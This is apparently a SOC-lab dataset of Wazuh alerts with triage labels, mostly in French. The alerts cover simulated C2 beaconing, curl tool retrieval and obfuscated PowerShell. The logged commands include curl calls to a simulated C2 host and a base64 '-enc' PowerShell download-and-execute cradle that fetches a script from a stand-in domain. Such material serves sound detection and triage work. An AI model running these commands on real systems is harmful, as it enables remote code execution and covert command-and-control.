@@ -1,0 +1,288 @@
+[
+  {
+    "alert": {
+      "agent": {
+        "ip": "127.0.0.1",
+        "name": "soc-lab",
+        "id": "001"
+      },
+      "previous_output": "type=SYSCALL msg=audit(1783187906.727:29957): arch=c000003e syscall=59 success=yes exit=0 a0=55950e1c9b60 a1=55950e1cee10 a2=55950e1c7130 a3=1b6 items=2 ppid=125275 pid=125371 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=152 comm=\"curl\" exe=\"/usr/bin/curl\" subj=unconfined key=\"audit-wazuh-c\"\u001dARCH=x86_64 SYSCALL=execve AUID=\"soc\" UID=\"soc\" GID=\"soc\" EUID=\"soc\" SUID=\"soc\" FSUID=\"soc\" EGID=\"soc\" SGID=\"soc\" FSGID=\"soc\" type=EXECVE msg=audit(1783187906.727:29957): argc=4 a0=\"curl\" a1=\"-s\" a2=\"-m3\" a3=\"http://c2-beacon-simulated.example.invalid/poll?id=4&t=1783187906\" type=CWD msg=audit(1783187906.727:29957): cwd=\"/home/soc\" type=PATH msg=audit(1783187906.727:29957): item=0 name=\"/usr/bin/curl\" inode=2631531 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PATH msg=audit(1783187906.727:29957): item=1 name=\"/lib64/ld-linux-x86-64.so.2\" inode=2631532 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PROCTITLE msg=audit(1783187906.727:29957): proctitle=6375726C002D73002D6D3300687474703A2F2F63322D626561636F6E2D73696D756C617465642E6578616D706C652E696E76616C69642F706F6C6C3F69643D3426743D31373833313837393036\ntype=SYSCALL msg=audit(1783187898.715:29950): arch=c000003e syscall=59 success=yes exit=0 a0=55950e1c6e60 a1=55950e1cd420 a2=55950e1c7130 a3=1b6 items=2 ppid=125275 pid=125366 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=152 comm=\"curl\" exe=\"/usr/bin/curl\" subj=unconfined key=\"audit-wazuh-c\"\u001dARCH=x86_64 SYSCALL=execve AUID=\"soc\" UID=\"soc\" GID=\"soc\" EUID=\"soc\" SUID=\"soc\" FSUID=\"soc\" EGID=\"soc\" SGID=\"soc\" FSGID=\"soc\" type=EXECVE msg=audit(1783187898.715:29950): argc=4 a0=\"curl\" a1=\"-s\" a2=\"-m3\" a3=\"http://c2-beacon-simulated.example.invalid/beacon?id=3&t=1783187898\" type=CWD msg=audit(1783187898.715:29950): cwd=\"/home/soc\" type=PATH msg=audit(1783187898.715:29950): item=0 name=\"/usr/bin/curl\" inode=2631531 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PATH msg=audit(1783187898.715:29950): item=1 name=\"/lib64/ld-linux-x86-64.so.2\" inode=2631532 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PROCTITLE msg=audit(1783187898.715:29950): proctitle=6375726C002D73002D6D3300687474703A2F2F63322D626561636F6E2D73696D756C617465642E6578616D706C652E696E76616C69642F626561636F6E3F69643D3326743D31373833313837383938",
+      "manager": {
+        "name": "wazuh.manager"
+      },
+      "data": {
+        "audit": {
+          "syscall": "59",
+          "gid": "1000",
+          "fsgid": "1000",
+          "session": "152",
+          "pid": "125377",
+          "suid": "1000",
+          "type": "SYSCALL",
+          "uid": "1000",
+          "egid": "1000",
+          "exe": "/usr/bin/curl",
+          "file": {
+            "inode": "2631531",
+            "mode": "0100755",
+            "name": "/usr/bin/curl"
+          },
+          "sgid": "1000",
+          "id": "29960",
+          "key": "audit-wazuh-c",
+          "auid": "1000",
+          "execve": {
+            "a1": "-s",
+            "a2": "-m3",
+            "a3": "http://c2-beacon-simulated.example.invalid/sync?id=5&t=1783187911",
+            "a0": "curl"
+          },
+          "euid": "1000",
+          "command": "curl",
+          "ppid": "125275",
+          "fsuid": "1000",
+          "exit": "0",
+          "cwd": "/home/soc",
+          "success": "yes",
+          "tty": "(none)",
+          "arch": "c000003e"
+        }
+      },
+      "rule": {
+        "firedtimes": 2,
+        "mail": false,
+        "level": 10,
+        "description": "Repeated network fetch commands executed in a short window (possible C2 beaconing)",
+        "groups": [
+          "local",
+          "pfa_custom",
+          "audit_command",
+          "pfa_c2_beaconing"
+        ],
+        "mitre": {
+          "technique": [
+            "Application Layer Protocol"
+          ],
+          "id": [
+            "T1071"
+          ],
+          "tactic": [
+            "Command and Control"
+          ]
+        },
+        "id": "100103",
+        "frequency": 3
+      },
+      "decoder": {
+        "parent": "auditd",
+        "name": "auditd"
+      },
+      "full_log": "type=SYSCALL msg=audit(1783187911.735:29960): arch=c000003e syscall=59 success=yes exit=0 a0=55950e1c91b0 a1=55950e1cd7e0 a2=55950e1c7130 a3=1b6 items=2 ppid=125275 pid=125377 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=152 comm=\"curl\" exe=\"/usr/bin/curl\" subj=unconfined key=\"audit-wazuh-c\"\u001dARCH=x86_64 SYSCALL=execve AUID=\"soc\" UID=\"soc\" GID=\"soc\" EUID=\"soc\" SUID=\"soc\" FSUID=\"soc\" EGID=\"soc\" SGID=\"soc\" FSGID=\"soc\" type=EXECVE msg=audit(1783187911.735:29960): argc=4 a0=\"curl\" a1=\"-s\" a2=\"-m3\" a3=\"http://c2-beacon-simulated.example.invalid/sync?id=5&t=1783187911\" type=CWD msg=audit(1783187911.735:29960): cwd=\"/home/soc\" type=PATH msg=audit(1783187911.735:29960): item=0 name=\"/usr/bin/curl\" inode=2631531 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PATH msg=audit(1783187911.735:29960): item=1 name=\"/lib64/ld-linux-x86-64.so.2\" inode=2631532 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PROCTITLE msg=audit(1783187911.735:29960): proctitle=6375726C002D73002D6D3300687474703A2F2F63322D626561636F6E2D73696D756C617465642E6578616D706C652E696E76616C69642F73796E633F69643D3526743D31373833313837393131",
+      "input": {
+        "type": "log"
+      },
+      "@timestamp": "2026-07-04T17:58:34.627Z",
+      "location": "/var/log/audit/audit-merged.log",
+      "id": "1783187914.57095204",
+      "timestamp": "2026-07-04T17:58:34.627+0000"
+    },
+    "triage": {
+      "incident_type": "Repeated network fetch commands executed in a short window",
+      "criticite": "haute",
+      "mitre_tactic": "Command and Control",
+      "mitre_technique": "T1071",
+      "resume": "Des requetes repetees vers la meme destination ont ete executees dans une courte fenetre de temps.",
+      "recommandation": "Investigate the source of the repeated network requests and determine if they are malicious."
+    },
+    "baseline_criticite": "haute"
+  },
+  {
+    "alert": {
+      "agent": {
+        "ip": "127.0.0.1",
+        "name": "soc-lab",
+        "id": "001"
+      },
+      "manager": {
+        "name": "wazuh.manager"
+      },
+      "data": {
+        "audit": {
+          "syscall": "59",
+          "gid": "1000",
+          "fsgid": "1000",
+          "session": "152",
+          "pid": "125371",
+          "suid": "1000",
+          "type": "SYSCALL",
+          "uid": "1000",
+          "egid": "1000",
+          "exe": "/usr/bin/curl",
+          "file": {
+            "inode": "2631531",
+            "mode": "0100755",
+            "name": "/usr/bin/curl"
+          },
+          "sgid": "1000",
+          "id": "29957",
+          "key": "audit-wazuh-c",
+          "auid": "1000",
+          "execve": {
+            "a1": "-s",
+            "a2": "-m3",
+            "a3": "http://c2-beacon-simulated.example.invalid/poll?id=4&t=1783187906",
+            "a0": "curl"
+          },
+          "euid": "1000",
+          "command": "curl",
+          "ppid": "125275",
+          "fsuid": "1000",
+          "exit": "0",
+          "cwd": "/home/soc",
+          "success": "yes",
+          "tty": "(none)",
+          "arch": "c000003e"
+        }
+      },
+      "rule": {
+        "firedtimes": 5,
+        "mail": false,
+        "level": 8,
+        "description": "Single network fetch via curl/wget - possible external tool/payload retrieval",
+        "groups": [
+          "local",
+          "pfa_custom",
+          "audit_command",
+          "pfa_phishing"
+        ],
+        "mitre": {
+          "technique": [
+            "Ingress Tool Transfer"
+          ],
+          "id": [
+            "T1105"
+          ],
+          "tactic": [
+            "Command and Control"
+          ]
+        },
+        "id": "100099"
+      },
+      "decoder": {
+        "parent": "auditd",
+        "name": "auditd"
+      },
+      "full_log": "type=SYSCALL msg=audit(1783187906.727:29957): arch=c000003e syscall=59 success=yes exit=0 a0=55950e1c9b60 a1=55950e1cee10 a2=55950e1c7130 a3=1b6 items=2 ppid=125275 pid=125371 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=152 comm=\"curl\" exe=\"/usr/bin/curl\" subj=unconfined key=\"audit-wazuh-c\"\u001dARCH=x86_64 SYSCALL=execve AUID=\"soc\" UID=\"soc\" GID=\"soc\" EUID=\"soc\" SUID=\"soc\" FSUID=\"soc\" EGID=\"soc\" SGID=\"soc\" FSGID=\"soc\" type=EXECVE msg=audit(1783187906.727:29957): argc=4 a0=\"curl\" a1=\"-s\" a2=\"-m3\" a3=\"http://c2-beacon-simulated.example.invalid/poll?id=4&t=1783187906\" type=CWD msg=audit(1783187906.727:29957): cwd=\"/home/soc\" type=PATH msg=audit(1783187906.727:29957): item=0 name=\"/usr/bin/curl\" inode=2631531 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PATH msg=audit(1783187906.727:29957): item=1 name=\"/lib64/ld-linux-x86-64.so.2\" inode=2631532 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PROCTITLE msg=audit(1783187906.727:29957): proctitle=6375726C002D73002D6D3300687474703A2F2F63322D626561636F6E2D73696D756C617465642E6578616D706C652E696E76616C69642F706F6C6C3F69643D3426743D31373833313837393036",
+      "input": {
+        "type": "log"
+      },
+      "@timestamp": "2026-07-04T17:58:29.631Z",
+      "location": "/var/log/audit/audit-merged.log",
+      "id": "1783187909.57089149",
+      "timestamp": "2026-07-04T17:58:29.631+0000"
+    },
+    "triage": {
+      "incident_type": "Recuperation d'un outil ou payload externe",
+      "criticite": "haute",
+      "mitre_tactic": "Command and Control",
+      "mitre_technique": "T1105",
+      "resume": "Un processus a utilise curl pour se connecter a une URL suspecte. Cela pourrait indiquer la recuperation d'un outil ou payload externe.",
+      "recommandation": "Investigue l'URL cible et le contexte de l'execution du processus curl."
+    },
+    "baseline_criticite": "moyenne"
+  },
+  {
+    "alert": {
+      "agent": {
+        "ip": "127.0.0.1",
+        "name": "soc-lab",
+        "id": "001"
+      },
+      "manager": {
+        "name": "wazuh.manager"
+      },
+      "data": {
+        "audit": {
+          "syscall": "59",
+          "gid": "1000",
+          "fsgid": "1000",
+          "session": "152",
+          "pid": "125283",
+          "suid": "1000",
+          "type": "SYSCALL",
+          "uid": "1000",
+          "egid": "1000",
+          "exe": "/snap/powershell/378/opt/powershell/pwsh",
+          "file": {
+            "inode": "596",
+            "mode": "0100755",
+            "name": "/snap/powershell/378/opt/powershell/pwsh"
+          },
+          "sgid": "1000",
+          "id": "29912",
+          "key": "audit-wazuh-c",
+          "auid": "1000",
+          "execve": {
+            "a1": "-enc",
+            "a2": "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGkAbgB2AGEAbABpAGQALwBzAC4AcABzADEAJwApAA==",
+            "a0": "/snap/powershell/378/opt/powershell/pwsh"
+          },
+          "euid": "1000",
+          "command": "pwsh",
+          "ppid": "125275",
+          "fsuid": "1000",
+          "exit": "0",
+          "cwd": "/home/soc",
+          "success": "yes",
+          "tty": "(none)",
+          "arch": "c000003e"
+        }
+      },
+      "rule": {
+        "firedtimes": 2,
+        "mail": true,
+        "level": 12,
+        "description": "Suspicious PowerShell execution detected via auditd",
+        "groups": [
+          "local",
+          "pfa_custom",
+          "audit_command",
+          "pfa_powershell"
+        ],
+        "mitre": {
+          "technique": [
+            "PowerShell"
+          ],
+          "id": [
+            "T1059.001"
+          ],
+          "tactic": [
+            "Execution"
+          ]
+        },
+        "id": "100101"
+      },
+      "decoder": {
+        "parent": "auditd",
+        "name": "auditd"
+      },
+      "full_log": "type=SYSCALL msg=audit(1783187869.015:29912): arch=c000003e syscall=59 success=yes exit=0 a0=564eeb62b738 a1=564f231e6b18 a2=564f231e6d48 a3=1 items=2 ppid=125275 pid=125283 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=152 comm=\"pwsh\" exe=\"/snap/powershell/378/opt/powershell/pwsh\" subj=snap.powershell.powershell key=\"audit-wazuh-c\"\u001dARCH=x86_64 SYSCALL=execve AUID=\"soc\" UID=\"soc\" GID=\"soc\" EUID=\"soc\" SUID=\"soc\" FSUID=\"soc\" EGID=\"soc\" SGID=\"soc\" FSGID=\"soc\" type=EXECVE msg=audit(1783187869.015:29912): argc=3 a0=\"/snap/powershell/378/opt/powershell/pwsh\" a1=\"-enc\" a2=\"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGkAbgB2AGEAbABpAGQALwBzAC4AcABzADEAJwApAA==\" type=CWD msg=audit(1783187869.015:29912): cwd=\"/home/soc\" type=PATH msg=audit(1783187869.015:29912): item=0 name=\"/snap/powershell/378/opt/powershell/pwsh\" inode=596 dev=07:03 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PATH msg=audit(1783187869.015:29912): item=1 name=\"/snap/core22/current/lib64/ld-linux-x86-64.so.2\" inode=7489 dev=07:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PROCTITLE msg=audit(1783187869.015:29912): proctitle=2F7573722F6C69622F736E6170642F736E61702D636F6E66696E65002D2D636C6173736963002D2D6261736500636F7265323200736E61702E706F7765727368656C6C2E706F7765727368656C6C002F7573722F6C69622F736E6170642F736E61702D6578656300706F7765727368656C6C2E706F7765727368656C6C002D65",
+      "input": {
+        "type": "log"
+      },
+      "@timestamp": "2026-07-04T17:57:51.610Z",
+      "location": "/var/log/audit/audit-merged.log",
+      "id": "1783187871.57005426",
+      "timestamp": "2026-07-04T17:57:51.610+0000"
+    },
+    "triage": {
+      "incident_type": "Execution PowerShell suspecte/obfusquee",
+      "criticite": "critique",
+      "mitre_tactic": "Execution",
+      "mitre_technique": "T1059.001",
+      "resume": "Un processus PowerShell a été lancé avec l'argument '-enc', indiquant une exécution potentiellement obfusquée.",
+      "recommandation": "Analyser le contenu du script PowerShell exécuté et rechercher des indicateurs de menace connus."
+    },
+    "baseline_criticite": "critique"
+  }
+]
